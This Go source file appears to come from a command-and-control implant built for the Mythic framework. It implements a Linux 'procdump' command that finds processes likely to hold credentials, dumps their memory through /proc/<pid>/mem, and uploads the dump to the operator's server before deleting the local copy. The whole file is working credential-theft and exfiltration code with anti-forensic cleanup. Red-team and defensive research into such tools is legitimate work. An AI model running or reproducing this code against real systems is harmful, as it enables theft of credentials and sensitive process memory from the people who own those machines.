//go:build linux
// +build linux

package commands

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// ProcdumpCommand implements process memory dumping on Linux via /proc/<pid>/mem.
type ProcdumpCommand struct{}

func (c *ProcdumpCommand) Name() string {
	return "procdump"
}

func (c *ProcdumpCommand) Description() string {
	return "Dump process memory via /proc/<pid>/mem (requires ptrace permissions or root)"
}

func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[procdumpArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Action == "" {
		args.Action = "dump"
	}

	switch strings.ToLower(args.Action) {
	case "dump":
		if args.PID <= 0 {
			return errorResult("Error: -pid is required for dump action")
		}
		return procdumpLinux(task, args.PID)
	case "lsass":
		return errorResult("Error: lsass action is Windows-only. Use -action dump -pid <PID> on Linux.\nTip: Use -action search to find credential-holding processes.")
	case "search":
		return procdumpSearch()
	default:
		return errorf("Unknown action: %s. Available on Linux: dump, search", args.Action)
	}
}

// procdumpLinux dumps the memory of a process using /proc/<pid>/mem.
func procdumpLinux(task structs.Task, pid int) structs.CommandResult {
	pidStr := strconv.Itoa(pid)
	procDir := filepath.Join("/proc", pidStr)

	// Verify process exists
	if _, err := os.Stat(procDir); err != nil {
		return errorf("Process %d not found: %v", pid, err)
	}

	// Get process name
	processName := getLinuxProcessName(pid)

	// Read memory maps
	mapsPath := filepath.Join(procDir, "maps")
	mapsData, err := os.ReadFile(mapsPath)
	if err != nil {
		return errorf("Cannot read %s: %v\nEnsure you have ptrace permissions (root or CAP_SYS_PTRACE)", mapsPath, err)
	}

	// Parse before zeroing — string() copies the bytes
	mapsContent := string(mapsData)
	structs.ZeroBytes(mapsData)

	regions := parseMapsContent(mapsContent)
	dumpable := filterDumpableRegions(regions)

	if len(dumpable) == 0 {
		return errorf("No dumpable memory regions found for PID %d (%d regions parsed, none passed filter)",
			pid, len(regions))
	}

	totalSize := totalRegionSize(dumpable)
	if totalSize > maxDumpSize {
		return errorf("Total dumpable memory (%s) exceeds safety limit (%s). Use a more targeted approach.",
			formatFileSize(int64(totalSize)), formatFileSize(maxDumpSize))
	}

	// Create temp file for the dump
	dumpFile, err := os.CreateTemp("", "")
	if err != nil {
		return errorf("Failed to create dump file: %v", err)
	}
	dumpPath := dumpFile.Name()

	// Open /proc/<pid>/mem
	memPath := filepath.Join(procDir, "mem")
	memFile, err := os.Open(memPath)
	if err != nil {
		dumpFile.Close()
		secureRemove(dumpPath)
		return errorf("Cannot open %s: %v\nEnsure you have ptrace permissions (root or CAP_SYS_PTRACE)", memPath, err)
	}

	// Read each dumpable region
	regionsDumped := 0
	bytesWritten := int64(0)
	regionsSkipped := 0
	buf := make([]byte, 4096)

	for _, region := range dumpable {
		_, seekErr := memFile.Seek(int64(region.Start), io.SeekStart)
		if seekErr != nil {
			regionsSkipped++
			continue
		}

		remaining := int64(region.Size())
		regionRead := false
		for remaining > 0 {
			toRead := int64(len(buf))
			if toRead > remaining {
				toRead = remaining
			}
			n, readErr := memFile.Read(buf[:toRead])
			if n > 0 {
				if _, writeErr := dumpFile.Write(buf[:n]); writeErr != nil {
					memFile.Close()
					dumpFile.Close()
					secureRemove(dumpPath)
					return errorf("Error writing dump: %v", writeErr)
				}
				bytesWritten += int64(n)
				regionRead = true
			}
			if readErr != nil {
				break // Region may be partially readable
			}
			remaining -= int64(n)
		}
		if regionRead {
			regionsDumped++
		} else {
			regionsSkipped++
		}
	}

	memFile.Close()
	dumpFile.Close()

	// Zero the read buffer
	structs.ZeroBytes(buf)

	if bytesWritten == 0 {
		secureRemove(dumpPath)
		return errorf("Failed to read any memory from PID %d. Process may have exited or permissions insufficient.", pid)
	}

	// Open for transfer
	file, err := os.Open(dumpPath)
	if err != nil {
		secureRemove(dumpPath)
		return errorf("Failed to open dump file for transfer: %v", err)
	}

	fileName := fmt.Sprintf("procdump_%d_%s.bin", pid, sanitizeFileName(processName))

	downloadMsg := structs.SendFileToMythicStruct{}
	downloadMsg.Task = &task
	downloadMsg.IsScreenshot = false
	downloadMsg.SendUserStatusUpdates = true
	downloadMsg.File = file
	downloadMsg.FileName = fileName
	downloadMsg.FullPath = dumpPath
	downloadMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- downloadMsg

	for {
		select {
		case <-downloadMsg.FinishedTransfer:
			file.Close()
			secureRemove(dumpPath)
			return successf("Successfully dumped %s (PID %d)\nDump size: %s (%d regions, %d skipped)\nFile uploaded to server and cleaned from disk.",
				processName, pid, formatFileSize(bytesWritten), regionsDumped, regionsSkipped)
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				file.Close()
				secureRemove(dumpPath)
				return errorResult("Dump upload cancelled")
			}
		}
	}
}

// procdumpSearch finds processes commonly holding credentials in memory.
func procdumpSearch() structs.CommandResult {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return errorf("Error reading /proc: %v", err)
	}

	type procInfo struct {
		PID     int
		Name    string
		Cmdline string
		User    string
		MemSize string
	}

	var found []procInfo
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(entry.Name())
		if err != nil {
			continue
		}

		name := getLinuxProcessName(pid)
		if name == "" {
			continue
		}

		// Check if this process name matches a known credential holder
		nameLower := strings.ToLower(name)
		isMatch := false
		for _, target := range credentialProcesses {
			if strings.Contains(nameLower, strings.ToLower(target)) {
				isMatch = true
				break
			}
		}
		if !isMatch {
			continue
		}

		// Get command line
		cmdline := ""
		if data, err := os.ReadFile(filepath.Join("/proc", entry.Name(), "cmdline")); err == nil {
			// cmdline uses null bytes as separators
			cmdline = strings.ReplaceAll(string(data), "\x00", " ")
			cmdline = strings.TrimSpace(cmdline)
			structs.ZeroBytes(data)
		}

		// Get process owner from status
		owner := getLinuxProcessOwner(pid)

		// Estimate dumpable memory size from maps
		memSize := "unknown"
		if mapsData, err := os.ReadFile(filepath.Join("/proc", entry.Name(), "maps")); err == nil {
			regions := parseMapsContent(string(mapsData))
			dumpable := filterDumpableRegions(regions)
			total := totalRegionSize(dumpable)
			memSize = formatFileSize(int64(total))
			structs.ZeroBytes(mapsData)
		}

		found = append(found, procInfo{
			PID:     pid,
			Name:    name,
			Cmdline: cmdline,
			User:    owner,
			MemSize: memSize,
		})
	}

	if len(found) == 0 {
		return successResult("No known credential-holding processes found.\nTip: Use -action dump -pid <PID> to dump any process by PID.")
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Found %d potential credential-holding processes:\n\n", len(found)))
	for _, p := range found {
		sb.WriteString(fmt.Sprintf("  PID %-7d  %-20s  Owner: %-10s  Memory: %s\n", p.PID, p.Name, p.User, p.MemSize))
		if p.Cmdline != "" {
			sb.WriteString(fmt.Sprintf("               Cmdline: %s\n", truncateString(p.Cmdline, 100)))
		}
	}
	sb.WriteString("\nUse: procdump -action dump -pid <PID> to dump a specific process.")

	return successResult(sb.String())
}

// getLinuxProcessName reads the process name from /proc/<pid>/comm.
func getLinuxProcessName(pid int) string {
	data, err := os.ReadFile(filepath.Join("/proc", strconv.Itoa(pid), "comm"))
	if err != nil {
		return fmt.Sprintf("PID_%d", pid)
	}
	return strings.TrimSpace(string(data))
}

// getLinuxProcessOwner reads the process owner UID from /proc/<pid>/status.
func getLinuxProcessOwner(pid int) string {
	data, err := os.ReadFile(filepath.Join("/proc", strconv.Itoa(pid), "status"))
	if err != nil {
		return "unknown"
	}
	defer structs.ZeroBytes(data)

	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "Uid:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				return "uid=" + fields[1]
			}
		}
	}
	return "unknown"
}
